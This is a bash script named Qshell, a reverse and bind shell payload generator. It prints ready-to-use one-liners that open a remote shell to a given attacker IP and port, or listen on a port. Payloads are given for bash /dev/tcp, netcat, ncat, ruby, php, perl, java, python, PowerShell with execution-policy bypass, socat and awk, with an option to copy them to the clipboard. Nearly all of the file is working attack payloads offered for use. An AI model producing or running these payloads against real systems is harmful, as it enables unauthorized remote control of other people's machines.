#! /bin/bash

#variables ####################################################################
shell="bash"
REVERSE="yes"

# help function ####################################################################
function help_menu(){
        cat <<'END'
Usage: qshell [OPTION] [arguments]
       qshell [-h] [--help] [-L HOST] [--lhost LHOST] [-P PORT] [--lport LPORT] 
              [-c] [--clipboard] [-v] [--version] [-l] [--list] 
              [-b] [--bind] [-t] [--type]
              
Arguments:
    -h --help             show this screen.
    -v --version          show version.
    -l --list             list all available options.
    -L --lhost            your local HOST IP that will be used in reverse shell.
    -P --lport            your PORT that will be used in reverse/bind shell.
    -c --clipboard        copy automatically the payload to the clipboard.
    -b --bind             bind shell payload, [reverse shell payload is the default one].
    -t --type             type of shell : sh, zsh, [bash is the default one].

Exemples: <-- I hate help/man pages without examples! -->
    Qshell bash -L 10.10.10.10 -P 4444 -c
    Qshell netcat -P 4444 -c --bind -t zsh
    Qshell python -L 10.10.10.10 -P 4444 -c 

More Info:
    made by @F33-Z
    visit: https://github.com/F33-Z/Quick_Shell
END
}

# list function ####################################################################
function list_menu(){
            cat <<'END'
Options:
----------------------
$_reverse_shell :
        bash
        nc       : Netcat OpenBsd
        ncE      : Netcat Traditional
        ncat
        python
        python3
        ruby
        php
        perl
        java
        powershell
        socat
        awk
----------------------
$_bind_shell :
        nc
        ncE
        python
        python3
        ruby
        php
        perl
        powershell
        socat
        awk
----------------------

END
}

# Treat All inputs ####################################################################
if [ $# -eq 0 ]
  then
    echo "No arguments supplied"
    echo "try: $0 --help"
    exit 0
else
    for i in $@
    do 
        input="$i"
        if [ "$input" == "--help" -o "$input" == "-h" ]
        then
            help_menu
            exit 1
        fi
        if [ "$input" == "--list" -o "$input" == "-l" ]
        then
            list_menu
            exit 2
        fi
        if [ "$input" == "--version" -o "$input" == "-v" ]
        then
            echo "Qshell 0.0.1"
            exit 3
        fi
        if [ "$input" == "--lhost" -o "$input" == "-L" ]
        then
            IP=$(echo $@ | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
        fi
        if [ "$input" == "--lport" -o "$input" == "-P" ]
        then
            PORT=$(echo $@ | tr . 0 | grep -oE '\b([0-9]{1,4}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])\b')
        fi
        if [ "$input" == "--type" -o "$input" == "-t" ]
        then
            shell=$(echo $@ | grep -oE 'bash|sh|zsh')
        fi
        if [ "$input" == "--bind" -o "$input" == "-b" ]
        then
            REVERSE="no"
        fi
    done
fi

#functions for reverse options ####################################################################
function option_reverse(){

    option_input="$1"

    if [ -z "$shell" ]; then
    	shell="bash"
    fi
    if [ -v $IP ]; then
        echo "IP is not provided"
        echo "add the flag --lhost to add your IP"
    elif [ -v $PORT ]; then
        echo "PORT number is not provided"
        echo "add the flag --lport to add your PORT number"
    else
        case $option_input in
        "bash" )
            echo "bash -i >& /dev/tcp/$IP/$PORT 0>&1"
        ;;


        "ncE" )
            echo "nc -e /bin/$shell $IP $PORT"
        ;;

	"nc" )
	    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/$shell -i 2>&1|nc $IP $PORT >/tmp/f"
	;;
	
	
        "ncat" )
            echo "ncat ${IP} ${PORT} -e /bin/${shell}"
        ;;


        "ruby" )
            cat <<END 
ruby -rsocket -e'f=TCPSocket.open("${IP}",${PORT}).to_i;exec sprintf("/bin/$shell -i <&%d >&%d 2>&%d",f,f,f)'
END
        ;;


        "php" )
            cat <<END 
php -r '\$sock=fsockopen("${IP}",${PORT});exec("/bin/$shell -i <&3 >&3 2>&3");'
END
        ;;


        "perl" )
            cat <<END 
perl -e 'use Socket;\$i="${IP}";\$p=${PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/$shell -i");};'
END
        ;;


        "java" )
            cat <<END
r = Runtime.getRuntime()
p = r.exec(["/bin/$shell","-c","exec 5<>/dev/tcp/${IP}/${PORT};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
END
        ;;


        "python" )   # This was tested under Linux / Python 2.7:
            cat <<END
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${IP}",${PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/${shell}","-i"])'
END
        ;;


        "python3" )  # check python3
            cat <<END
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${IP}",${PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/${shell}","-i"])'
END
        ;;


        "powershell" )
            cat <<END 
powershell -nop -c "\$client = New-Object System.Net.Sockets.TCPClient('${IP}',${PORT});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
END
        ;;

        "socat" )
            cat <<END
socat exec:'$shell -li',pty,stderr,setsid,sigint,sane tcp:${IP}:${PORT}
END
        ;;

        "awk" )
            cat <<END
awk 'BEGIN {s = "/inet/tcp/0/${IP}/${PORT}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print \$0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
END
        ;;

        * )
            echo "unvalid option"
            echo "usage : $0 [option] [arguments]"
            echo "To view all available options : $0 --list "
            echo "Example : $0 python --lhost 10.10.10.10 --lport 4444 -c"
        ;;


        esac
    fi
}

#functions for bind options ####################################################################
function option_bind(){

    option_input="$1"

    if [ -z "$shell" ]; then
    	shell="bash"
    fi
    if [ -v $PORT ]; then
        echo "PORT number is not provided"
        echo "add the flag --lport to add your PORT number"
    else
        case $option_input in

        "ncE" )
            echo "nc -lvp $PORT -c /bin/$shell"
        ;;
        
        "nc" )
            echo "rm /tmp/VAR1;mkfifo /tmp/VAR1;cat /tmp/VAR1|/bin/$shell -i 2>&1|nc -lvp $PORT >/tmp/VAR1"
        ;;
        

        "ruby" )
            cat <<END 
ruby -rsocket -e 'VAR1=TCPServer.new($PORT);VAR2=VAR1.accept;VAR1.close();\$stdin.reopen(VAR2);\$stdout.reopen(VAR2);\$stderr.reopen(VAR2);\$stdin.each_line{|VAR3|VAR3=VAR3.strip;next if VAR3.length==0;(IO.popen(VAR3,"rb"){|VAR4|VAR4.each_line{|VAR5|c.puts(VAR5.strip)}})rescue nil}'
END
        ;;


        "php" )
            cat <<END 
php -r '\$VAR1=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind(\$VAR1,"0.0.0.0",$PORT);socket_listen(\$VAR1,1);\$VAR2=socket_accept(\$VAR1);while(NUM1){if(!socket_write(\$VAR2,"$ ",2))exit;\$VAR3=socket_read(\$VAR2,100);\$VAR4=popen("\$VAR3","r");while(!feof(\$VAR4)){\$VAR5=fgetc(\$VAR4);socket_write(\$VAR2,\$VAR5,strlen(\$VAR5));}}'
END
        ;;


        "perl" )
            cat <<END 
perl -MSocket -e '\$VAR1=${PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in(\$VAR1, INADDR_ANY));listen(S,SOMAXCONN);for(;\$VAR1=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/$shell -i");};'
END
        ;;

        "python" )   # This was tested under Linux / Python 2.7:
            cat <<END
python -c "import socket,subprocess,os;VAR1=socket.socket(socket.AF_INET,socket.SOCK_STREAM);VAR1.bind(('',${PORT}));VAR1.listen(1);conn,addr=VAR1.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);VAR2=subprocess.call(['/bin/${shell}','-i'])"
END
        ;;

        "python3" )
            cat <<END
python3 -c "import socket,subprocess,os;VAR1=socket.socket(socket.AF_INET,socket.SOCK_STREAM);VAR1.bind(('',${PORT}));VAR1.listen(1);conn,addr=VAR1.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);VAR2=subprocess.call(['/bin/${shell}','-i'])"
END
        ;;

        "powershell" )
                cat <<END 
powershell.exe -nop -ep bypass -Command "\$VAR1=$PORT;\$VAR2=[System.Net.Sockets.TcpListener]\$VAR1;\$VAR2.Start();\$VAR3=\$VAR2.AcceptTCPClient();\$VAR4=\$VAR3.GetStream();[byte[]]\$VAR5=0..65535|%{0};\$VAR6=([text.encoding]::ASCII).GetBytes('Windows PowerShell running as user '+\$env:username+' on '+\$env:computername+'nCopyright (C) 2015 Microsoft Corporation. All rights reserved.');\$VAR4.Write(\$VAR6,0,\$VAR6.Length);\$VAR6=([text.encoding]::ASCII).GetBytes('PS '+(Get-Location).Path+'> ');\$VAR4.Write(\$VAR6,0,\$VAR6.Length);while((\$VAR7=\$VAR4.Read(\$VAR5,0,\$VAR5.Length)) -ne 0){\$VAR8=([text.encoding]::ASCII).GetString(\$VAR5,0,\$VAR7);try{\$VAR9=(Invoke-Expression -command \$VAR8 2>&1 | Out-String )}catch{Write-Warning 'Something went wrong with execution of command on the target.';Write-Error \$_;};\$VAR10=\$VAR9+ 'PS '+(Get-Location).Path + '> ';\$VAR11=(\$error[0] | Out-String);\$error.clear();\$VAR10=\$VAR10+\$VAR11;\$VAR6=([text.encoding]::ASCII).GetBytes(\$VAR10);\$VAR4.Write(\$VAR6,0,\$VAR6.Length);\$VAR4.Flush();};\$VAR3.Close();if(\$VAR2){\$VAR2.Stop();};"
END
        ;;

        "socat" )
        cat <<END
socat udp-listen:$PORT exec:'$shell -li',pty,stderr,sane 2>&1>/dev/null &
END
        ;;

        "awk" )
                cat <<END
VAR1=$PORT;awk -v VAR2="\$VAR1" 'BEGIN{VAR3=\"/inet/tcp/"VAR2"/0/0\";for(;VAR3|&getline VAR4;close(VAR4))while(VAR4|getline)print|&VAR3;close(VAR3)}'
END
        ;;

        * )
            echo "unvalid option"
            echo "usage : $0 [option] [arguments]"
            echo "To view all available options : $0 --list "
            echo "Example : $0 python --lport 4444 -c"
        ;;


        esac
    fi
}

array=("$@")

if [[ " ${array[*]} " =~ "--clipboard" || " ${array[*]} " =~ "-c" ]]; then 
    if [ "$REVERSE" == "yes" ]; then
        option_reverse "$1"
    	option_reverse "$1"| xclip -selection c -r
    else
    	option_bind "$1"
    	option_bind "$1"| xclip -selection c -r
    fi
else 
    if [ "$REVERSE" == "yes" ]; then
        option_reverse "$1"
    else
    	option_bind "$1" 
    fi
fi